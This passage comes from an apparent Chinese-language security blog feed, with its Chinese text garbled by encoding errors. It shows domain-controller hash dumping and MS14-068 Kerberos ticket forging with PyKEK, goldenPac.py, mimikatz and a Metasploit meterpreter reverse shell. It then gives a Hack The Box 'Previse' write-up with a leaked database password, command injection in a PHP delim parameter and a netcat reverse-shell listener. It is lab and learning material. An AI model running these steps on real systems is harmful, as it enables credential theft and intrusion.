class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/credentials/domain_hashdump):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CLEANUP  true             yes       Automatically delete ntds backup created</span><br><span class="line">   RHOST    localhost        yes       Target address range</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line">   TIMEOUT  60               yes       Timeout for WMI command in seconds</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Session has Admin privs</span><br><span class="line">[*] Session is on a Domain Controller</span><br><span class="line">[-] You are running 32-bit Meterpreter on a 64 bit system</span><br><span class="line">[-] Try migrating to a 64-bit process and try again</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; </span><br></pre></td></tr></table></figure><h2 id="0x05-vshadow-exeå’ŒQuarksPwDump-exeå¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼"><a href="#0x05-vshadow-exeå’ŒQuarksPwDump-exeå¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼" class="headerlink" title="0x05.vshadow.exeå’ŒQuarksPwDump.exeå¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼"></a>0x05.vshadow.exeå’ŒQuarksPwDump.exeå¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼</h2><h2 id="0x06-KerberosåŸŸç”¨æˆ·ææƒæ¼æ´åˆ†æ"><a href="#0x06-KerberosåŸŸç”¨æˆ·ææƒæ¼æ´åˆ†æ" class="headerlink" title="0x06.KerberosåŸŸç”¨æˆ·ææƒæ¼æ´åˆ†æ"></a>0x06.KerberosåŸŸç”¨æˆ·ææƒæ¼æ´åˆ†æ</h2><h3 id="1-PyKEKå·¥å…·åŒ…"><a href="#1-PyKEKå·¥å…·åŒ…" class="headerlink" title="1.PyKEKå·¥å…·åŒ…"></a>1.PyKEKå·¥å…·åŒ…</h3><p><code>æŸ¥çœ‹è¡¥ä¸å®‰è£…æƒ…å†µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get hotfixid</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ç”¨æˆ·SID</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨å…¶ä¸­çš„MS14-068.exeç”Ÿæˆé«˜æƒé™ç¥¨æ®</code></p><blockquote><p>-u <userName>@<domainName>:ç”¨æˆ·å@åŸŸåã€‚<br>-s <userSid>: ç”¨æˆ·SIDã€‚<br>-d <domainControlerAddr>:åŸŸæ§åˆ¶å™¨åœ°å€ã€‚<br>-p <clearPassword>: æ˜æ–‡å¯†ç ã€‚<br>â€“rc4 <ntlmHash>:åœ¨æ²¡æœ‰æ˜æ–‡å¯†ç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡NTLM Hashç™»å½•ã€‚</ntlmHash></clearPassword></domainControlerAddr></userSid></domainName></userName></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå -s åŸŸæˆå‘˜sid -d åŸŸæ§åˆ¶å™¨åœ°å€ -påŸŸæˆå‘˜å¯†ç </span><br><span class="line"> </span><br><span class="line">pythoè„šæœ¬næ¡ˆä¾‹ï¼špython ms14-068.py -u administrator@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-500 -d 10.10.10.10 -p 11</span><br><span class="line">exeæ¡ˆä¾‹ï¼šms14-068.exe -u win7dc1@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-1120 -d 10.10.10.10 -p passwd</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€(rootğŸ’€kali)-[~/Downloads/pykek-master]</span><br><span class="line">â””â”€# python ms14-068.py -u win7dc1@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-1120 -d 10.10.10.10 -p passwd        1 â¨¯</span><br><span class="line">  [+] Building AS-REQ for 10.10.10.10... Done!</span><br><span class="line">  [+] Sending AS-REQ to 10.10.10.10... Done!</span><br><span class="line">  [+] Receiving AS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Parsing AS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Building TGS-REQ for 10.10.10.10... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 10.10.10.10... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Creating ccache file &#x27;TGT_win7dc1@jiye.net.ccache&#x27;... Done!</span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/Downloads/pykek-master]</span><br></pre></td></tr></table></figure><p><code>å¯¼å‡ºç¥¨æ®åˆ°mimikatzç›®å½•ä¸‹å¹¶æ¸…é™¤ç¥¨æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><p><code>æ³¨å…¥ç¥¨æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;TGT_win7dc1@jiye.net.ccache&quot;</span><br></pre></td></tr></table></figure><p><code>åˆ—å‡ºç›®å½•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure><h3 id="2-goldenPac-py"><a href="#2-goldenPac-py" class="headerlink" title="2.goldenPac.py"></a>2.goldenPac.py</h3><p><code>å®‰è£…Kerberoså®¢æˆ·ç«¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install krb5-user -y</span><br></pre></td></tr></table></figure><p><code>åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 goldenPac.py jiye.net/Administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure><h3 id="3-msfæ¨¡å—åˆ©ç”¨"><a href="#3-msfæ¨¡å—åˆ©ç”¨" class="headerlink" title="3.msfæ¨¡å—åˆ©ç”¨"></a>3.msfæ¨¡å—åˆ©ç”¨</h3><p><code>ç”Ÿæˆç¥¨æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure><p><code>msfä¸æ”¯æŒbinæ–‡ä»¶ï¼Œæ‰€ä»¥è½¬æ¢ç¥¨æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::clist &quot;.......bin&quot; /export</span><br></pre></td></tr></table></figure><p><code>ä¹‹ååå¼¹meterpreter shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi ç¥¨æ®</span><br></pre></td></tr></table></figure><p><code>åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/local/current_user_psexec </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set TECHNIQUE PSH</span><br><span class="line">TECHNIQUE =&gt; PSH</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set RHOSTS jiye.net</span><br><span class="line">RHOSTS =&gt; win2008.hello.com</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set lhost 10.10.10.130</span><br><span class="line">lhost =&gt; 1.1.1.5</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; run</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;åœ¨é€šå¸¸æƒ…å†µä¸‹ã€å³ä½¿æ‹¥æœ‰ç®¡ç†å‘˜æƒé™,ä¹Ÿæ— æ³•è¯»å–åŸŸæ§åˆ¶å™¨ä¸­çš„C:\Windwos\NTDS\ntds.ditæ–‡ä»¶(æ´»åŠ¨ç›®å½•å§‹ç»ˆè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ–‡ä»¶è¢«ç¦æ­¢è¯»å–)ã€‚ä½¿ç”¨Windowsæœ¬åœ°å·å½±æ‹·è´æœåŠ¡å¯ä»¥è·å¾—æ–‡ä»¶çš„å‰¯æœ¬ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x01-åŸŸæ§ä¸­-å·å½±æ‹·è´æœåŠ¡æå–ntds-dit&quot;&gt;&lt;a href=&quot;#0x01-åŸŸæ§ä¸­-å·å½±æ‹·è´æœåŠ¡æå–ntds-dit&quot; class=&quot;headerlink&quot; title=&quot;0x01.(åŸŸæ§ä¸­)å·å½±æ‹·è´æœåŠ¡æå–ntds.dit&quot;&gt;&lt;/a&gt;0x01.(åŸŸæ§ä¸­)å·å½±æ‹·è´æœåŠ¡æå–ntds.dit&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;åœ¨æ´»åŠ¨ç›®å½•ä¸­,æ‰€æœ‰çš„æ•°æ®éƒ½ä¿å­˜åœ¨ ntds.ditæ–‡ä»¶ä¸­ã€‚ntds.ditæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶,å­˜å‚¨ä½ç½®ä¸ºåŸŸæ§åˆ¶å™¨çš„%SystemRoot%ntds\ntds.ditã€‚ntds.dit ä¸­åŒ…å«(ä½†ä¸é™äº)ç”¨æˆ·åã€æ•£åˆ—å€¼ã€ç»„ã€GPPã€OUç­‰ä¸æ´»åŠ¨ç›®å½•ç›¸å…³çš„ä¿¡æ¯ã€‚å®ƒå’ŒSAMæ–‡ä»¶ä¸€æ ·ï¼Œæ˜¯è¢«Windowsæ“ä½œç³»ç»Ÿé”å®šçš„ã€‚æœ¬èŠ‚å°†ä»‹ç»å¦‚ä½•ä»ç³»ç»Ÿä¸­å¯¼å‡ºntds.dit,ä»¥åŠå¦‚ä½•è¯»å–ntds.ditä¸­çš„ä¿¡æ¯ã€‚åœ¨ä¸€èˆ¬æƒ…å†µä¸‹,ç³»ç»Ÿè¿ç»´äººå‘˜ä¼šåˆ©ç”¨å·å½±æ‹·è´æœåŠ¡ï¼ˆVolume Shadow Copy Service, VSSï¼‰å®ç°è¿™äº›æ“ä½œã€‚VSSæœ¬è´¨ä¸Šå±å¿«ç…§ï¼ˆSnapshot)æŠ€æœ¯çš„ä¸€ç§ï¼Œä¸»è¦ç”¨äºå¤‡ä»½å’Œæ¢å¤ï¼ˆå³ä½¿ç›®æ ‡æ–‡ä»¶å¤„äºé”å®šçŠ¶æ€ï¼‰ã€‚&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Previse</title>
    <link href="https://lunamoore.github.io/2021/08/16/HTB-Previse/"/>
    <id>https://lunamoore.github.io/2021/08/16/HTB-Previse/</id>
    <published>2021-08-16T12:29:51.000Z</published>
    <updated>2021-08-16T12:35:07.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/08/16/HTB-Previse/image-20210816113010834.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æœé›†"><a href="#0x01-ä¿¡æ¯æœé›†" class="headerlink" title="0x01.ä¿¡æ¯æœé›†"></a>0x01.ä¿¡æ¯æœé›†</h2><p><code>å¯ä»¥çœ‹åˆ°åªå¼€æ”¾äº†22ä¸80ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/Previse]</span><br><span class="line">â””â”€# nmap -sC -sV -sT 10.10.11.104 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 08:54 EDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.60s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 80.49 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>åªæœ‰ä¸€ä¸ªç™»å…¥æ¡†ã€‚å°è¯•å¼±å£ä»¤æ— æœ</code></p><img src="/2021/08/16/HTB-Previse/image-20210816113441214.png" class><h2 id="0x03-æ‰«ç›®å½•"><a href="#0x03-æ‰«ç›®å½•" class="headerlink" title="0x03.æ‰«ç›®å½•"></a>0x03.æ‰«ç›®å½•</h2><p><code>å…¶ä»–éƒ½éœ€è¦ç™»å…¥åæ‰å¯ä»¥è®¿é—®ï¼Œåªæœ‰nav.phpå¯ä»¥è®¿é—®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/Previse]</span><br><span class="line">â””â”€# gobuster dir -u http://10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php     </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.11.104</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/15 23:38:09 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/nav.php              (Status: 200) [Size: 1248]</span><br><span class="line">/footer.php           (Status: 200) [Size: 217] </span><br><span class="line">/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]</span><br><span class="line">/download.php         (Status: 302) [Size: 0] [--&gt; login.php]   </span><br><span class="line">/header.php           (Status: 200) [Size: 980]                 </span><br><span class="line">/files.php            (Status: 302) [Size: 4914] [--&gt; login.php]</span><br><span class="line">/login.php            (Status: 200) [Size: 2224]                </span><br><span class="line">/config.php           (Status: 200) [Size: 0]                   </span><br><span class="line">/accounts.php         (Status: 302) [Size: 3994] [--&gt; login.php]</span><br><span class="line">/status.php           (Status: 302) [Size: 2968] [--&gt; login.php]</span><br><span class="line">/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.104/css/]</span><br><span class="line">/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.104/js/] </span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                 </span><br><span class="line">/logs.php             (Status: 302) [Size: 0] [--&gt; login.php]                 </span><br><span class="line">                                                                              </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/16 00:12:43 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-è®¿é—®nav-php"><a href="#0x04-è®¿é—®nav-php" class="headerlink" title="0x04.è®¿é—®nav.php"></a>0x04.è®¿é—®nav.php</h2><p><code>å¯ä»¥çœ‹åˆ°åˆ›å»ºç”¨æˆ·é“¾æ¥ï¼Œä½†æ˜¯éƒ½é‡å®šå‘äº†</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124236847.png" class><p><code>burpæŠ“åŒ…ï¼Œä¿®æ”¹å“åº”ç </code></p><img src="/2021/08/16/HTB-Previse/image-20210816124349179.png" class><p><code>ä¿®æ”¹ä¸º200æ”¾è¿‡</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124426566.png" class><p><code>å¯ä»¥çœ‹åˆ°å¯ä»¥åˆ›å»ºç”¨æˆ·äº†</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124516603.png" class><h2 id="0x05-ç™»å…¥"><a href="#0x05-ç™»å…¥" class="headerlink" title="0x05.ç™»å…¥"></a>0x05.ç™»å…¥</h2><p><code>åˆ›å»ºadminç”¨æˆ·åç™»å…¥</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124731679.png" class><p><code>åœ¨fliesæ ‡ç­¾ä¸‹å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†ä¸èƒ½åˆ©ç”¨ã€‚å¹¶æœ‰ç½‘ç«™å¤‡ä»½æ–‡ä»¶ä¸”å¯ä»¥ä¸‹è½½ï¼Œé‚£å°±ä¸‹è½½ä¸‹æ¥</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124934439.png" class><p><code>æŸ¥çœ‹backupï¼Œå…¶ä¸­config.phpä¸logs.phpæœ‰ç”¨ï¼Œå®¡è®¡ä»£ç ï¼Œå‘ç°delimå‚æ•°å¤„å­˜åœ¨å‘½ä»¤æ³¨å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">config.php</span><br><span class="line">å¾—åˆ°æ•°æ®ç”¨æˆ·ä¸å¯†ç </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function connectDB()&#123;</span><br><span class="line">    $host = &#x27;localhost&#x27;;</span><br><span class="line">    $user = &#x27;root&#x27;;</span><br><span class="line">    $passwd = &#x27;mySQL_p@ssw0rd!:)&#x27;;</span><br><span class="line">    $db = &#x27;previse&#x27;;</span><br><span class="line">    $mycon = new mysqli($host, $user, $passwd, $db);</span><br><span class="line">    return $mycon;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">logs.php</span><br><span class="line">æ—¥å¿—è¾“å‡ºç³»ç»Ÿä¸ºpythonå†™çš„(/opt/scripts/log_process.py)</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;])) &#123;</span><br><span class="line">    header(&#x27;Location: login.php&#x27;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (!$_SERVER[&#x27;REQUEST_METHOD&#x27;] == &#x27;POST&#x27;) &#123;</span><br><span class="line">    header(&#x27;Location: login.php&#x27;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//</span><br><span class="line">/////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">output = <span class="built_in">exec</span>(<span class="string">&quot;/usr/bin/python /opt/scripts/log_process.py &#123;<span class="variable">$_POST</span>[&#x27;delim&#x27;]&#125;&quot;</span>);</span></span><br><span class="line">echo $output;</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">filepath = <span class="string">&quot;/var/www/out.log&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">filename = <span class="string">&quot;out.log&quot;</span>;    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">if(file_exists($</span><span class="bash">filepath)) &#123;</span></span><br><span class="line">    header(&#x27;Content-Description: File Transfer&#x27;);</span><br><span class="line">    header(&#x27;Content-Type: application/octet-stream&#x27;);</span><br><span class="line">    header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.basename($filepath).&#x27;&quot;&#x27;);</span><br><span class="line">    header(&#x27;Expires: 0&#x27;);</span><br><span class="line">    header(&#x27;Cache-Control: must-revalidate&#x27;);</span><br><span class="line">    header(&#x27;Pragma: public&#x27;);</span><br><span class="line">    header(&#x27;Content-Length: &#x27; . filesize($filepath));</span><br><span class="line">    ob_clean(); // Discard data in the output buffer</span><br><span class="line">    flush(); // Flush system headers</span><br><span class="line">    readfile($filepath);</span><br><span class="line">    die();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    http_response_code(404);</span><br><span class="line">    die();</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x06-æ¼æ´éªŒè¯"><a href="#0x06-æ¼æ´éªŒè¯" class="headerlink" title="0x06.æ¼æ´éªŒè¯"></a>0x06.æ¼æ´éªŒè¯</h2><p><code>kaliç›‘å¬6666ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666                                                                                                               1 â¨¯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>curlæ¢æµ‹</code></p><img src="/2021/08/16/HTB-Previse/image-20210816173652411.png" class><p><code>kaliå›æ˜¾</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666                                                                                                               1 â¨¯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.11.104] 35806</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 10.10.17.216:6666</span><br><span class="line">User-Agent: curl/7.58.0</span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x07-åå¼¹shell"><a href="#0x07-åå¼¹shell" class="headerlink" title="0x07.åå¼¹shell"></a>0x07.åå¼¹shell</h2><p><code>kaliç»§ç»­ç›‘å¬</code>\</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666                                                                                                               1 â¨¯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span 